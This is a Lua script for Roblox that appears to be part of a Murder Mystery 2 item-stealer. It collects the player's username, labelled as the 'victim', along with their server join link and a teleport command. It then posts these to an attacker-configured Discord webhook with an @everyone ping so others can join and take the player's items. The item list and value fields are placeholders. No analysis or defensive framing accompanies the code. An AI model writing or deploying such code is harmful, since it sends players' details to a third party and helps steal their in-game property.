local webhook = _G.webhook
local prefix = "--[[@everyone]] "

local function SendFirstMessage(prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = game.Players.LocalPlayer.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "test",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: "),
            inline = false
        }
    }

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "code successful"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

SendFirstMessage(prefix)
